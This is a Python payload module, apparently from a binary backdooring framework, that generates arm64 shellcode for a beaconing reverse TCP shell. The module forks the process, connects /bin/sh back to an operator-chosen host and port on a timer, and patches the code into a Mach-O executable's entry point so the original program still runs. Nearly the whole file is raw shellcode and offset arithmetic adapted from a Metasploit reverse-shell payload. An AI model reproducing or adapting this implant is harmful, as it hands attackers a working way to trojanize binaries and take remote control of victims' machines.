import struct
import os
import logging
from core import support
from common import common

# PLACEHOLDER, MUST BE UPDATED TO SUPPORT arm64

logger = logging.getLogger(__name__)


class beaconing_reverse_shell_tcp():

    def __init__(self):

        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "beaconing_reverse_shell_tcp"
        self.description = """Basic beaconing_reverse_shell_tcp"""
        self.requirements = {'MODE': 'How the patching will happen',
                             'HOST': '<HOST to connect back to>',
                             'PORT': '<Port to connect back to>',
                             'BEACON': 'time in secs to beacon out',
                             'ENCODER': '<Encoder you want to use, else none>'
                             }
        self.supported_modes = ['remove_signature']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

    def invoke(self, PM):
        # Expose patching method objects

        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        logger.debug(dir(self.PM))
        if support.support(self).check_reqs() is False:
            return False

        return self.run()

    def run(self):

        # FORK:
        #self.shellcode2 = b"\x00\x00\x3e\xd4"    # breakpoint
        self.shellcode2 = b"\xfb\x03\x01\xaa"     # mov x27, x1
        self.shellcode2 += b"\xfc\x03\x00\xaa"    # mov x28, x0
        self.shellcode2 += b"\x50\x00\x80\xd2"    # mov     x16, #0x2
        self.shellcode2 += b"\x01\x10\x00\xd4"    # svc     #0   # FORK
        self.shellcode2 += b"\xFA\x03\x00\xAA"    # mov x26, x0
        self.shellcode2 += b"\x90\x02\x80\xD2"    # movz x16, #20   //getpid()
        self.shellcode2 += b"\x01\x10\x00\xd4"    # svc getpid()
        self.shellcode2 += b"\x1F\x00\x1A\xEB"    # cmp x0, x26
        self.shellcode2 += b"\xe1\x03\x1b\xaa"    # mov x1, x27
        self.shellcode2 += b"\xe0\x03\x1c\xaa"    # mov x0, x28
        self.shellcode2 += b"\xe1\x04\x00\x54"      # b.ne after payload

        # PAYLOAD:
        # modified from apple_ios/aarch64/shell_reverse_tcp - 152 bytes
        # https://metasploit.com/
        self.shellcode2 += bytes("\x40\x00\x80\xd2\x21\x00\x80\xd2\x02\x00\x80\xd2"
                                 "\x30\x0c\x80\xd2\x01\x00\x00\xd4\xe3\x03\x00\xaa"
                                 "\x41\x03\x00\x10\x02\x02\x80\xd2\x50\x0c\x80\xd2"
                                 "\x01\x00\x00\xd4\x60\x02\x00\x35\xe0\x03\x03\xaa"
                                 "\x02\x00\x80\xd2\x01\x00\x80\xd2\x50\x0b\x80\xd2"
                                 "\x01\x00\x00\xd4\x21\x00\x80\xd2\x50\x0b\x80\xd2"
                                 "\x01\x00\x00\xd4\x41\x00\x80\xd2\x50\x0b\x80\xd2"
                                 "\x01\x00\x00\xd4\x80\x01\x00\x10\x02\x00\x80\xd2"
                                 "\xe0\x03\x00\xf9\xe2\x07\x00\xf9\xe1\x03\x00\x91"
                                 "\x70\x07\x80\xd2\x01\x00\x00\xd4\x00\x00\x80\xd2"
                                 "\x30\x00\x80\xd2\x01\x00\x00\xd4",
                                 'iso-8859-1'
                                 )

        self.shellcode2 += b"\x02\x00"
        self.shellcode2 += struct.pack(">H", int(self.PORT))
        self.shellcode2 += common.pack_ip_addresses(self.HOST)
        self.shellcode2 += b"\x2f\x62\x69\x6e"
        self.shellcode2 += b"\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00"

        # TIME CHECK:
        self.shellcode2 += b"\xE0\x03\x00\x91"     # mov  x0, sp
        self.shellcode2 += b"\x01\x00\x80\xD2"    # movz x1, #0
        self.shellcode2 += b"\x90\x0E\x80\xD2"    # movz x16, #0x74 # gettimeofday
        self.shellcode2 += b"\x01\x10\x00\xD4"    # svc  #0x80
        self.shellcode2 += b"\xE1\x03\x40\xF9"    # ldr  x1, [sp]
        # BEACON calculation here
        # it's  \x3C\ + struct.pack("<H" DELAY * 4) + \x91\
        self.shellcode2 += b"\x3B"
        self.shellcode2 += struct.pack("<H", int(self.BEACON) * 4)
        self.shellcode2 += b"\x91"
        # ^^ add  x27, x1, #0xf //Beacon
        self.shellcode2 += b"\xE0\x03\x00\x91"    # mov  x0, sp
        self.shellcode2 += b"\x01\x00\x80\xD2"    # movz x1, #0
        self.shellcode2 += b"\x90\x0E\x80\xD2"    # movz x16, #0x74 # gettimeofday
        self.shellcode2 += b"\x01\x10\x00\xD4"    # svc  #0x80
        self.shellcode2 += b"\xE1\x03\x40\xF9"    # ldr  x1, [sp]
        self.shellcode2 += b"\x3F\x00\x1B\xEB"    # cmp  x1, x27
        self.shellcode2 += b"\x4D\xFF\xFF\x54"    # b.le #0x18 <--- back to closests gettimeofday

        self.shellcode2 += b"\xc2\xff\xff\x17"  # add jmp back to the FORK in shellcode 1

        # Shellcode 1 Start
        # self.shellcode1 = b"\x00\x00\x3e\xd4"     #breakpoint brk #0xf000

        self.shellcode1 = b"\xfb\x03\x01\xaa"     # mov x27, x1
        self.shellcode1 += b"\xfc\x03\x00\xaa"    # mov x28, x0
        self.shellcode1 += b"\x50\x00\x80\xd2"    # mov     x16, #0x2
        self.shellcode1 += b"\x01\x10\x00\xd4"    # svc     #0   # FORK
        self.shellcode1 += b"\xFA\x03\x00\xAA"    # mov x26, x0
        self.shellcode1 += b"\x90\x02\x80\xD2"    # movz x16, #20   //getpid()
        self.shellcode1 += b"\x01\x10\x00\xd4"    # svc getpid()
        self.shellcode1 += b"\x1F\x00\x1A\xEB"    # cmp x0, x26
        self.shellcode1 += b"\xe1\x03\x1b\xaa"    # mov x1, x27
        self.shellcode1 += b"\xe0\x03\x1c\xaa"    # mov x0, x28

        PC = struct.unpack("<I", self.BDF.text_section['Offset'])[0] - \
            len(self.shellcode2)

        target = struct.unpack("<I", self.BDF.text_section['Offset'])[0]
        offset = target - PC + 4

        instr_value = struct.pack("<I", ((offset << 2) * 2) + 1).strip(b"\x00")

        if len(instr_value) < 3:
            instr_value += b"\x00" * (3 - len(instr_value))

        self.shellcode1 += instr_value

        self.shellcode1 += b"\x54"

        PC = struct.unpack("<I", self.BDF.text_section['Offset'])[0]  - 4
        target = struct.unpack("<Q", self.BDF.LC_MAIN['EntryOffset'])[0]
        instr = struct.pack("<I", (0b000101 << 26) | (target - PC) >> 2)

        self.shellcode = self.shellcode1 + self.shellcode2 + instr

        return self.shellcode
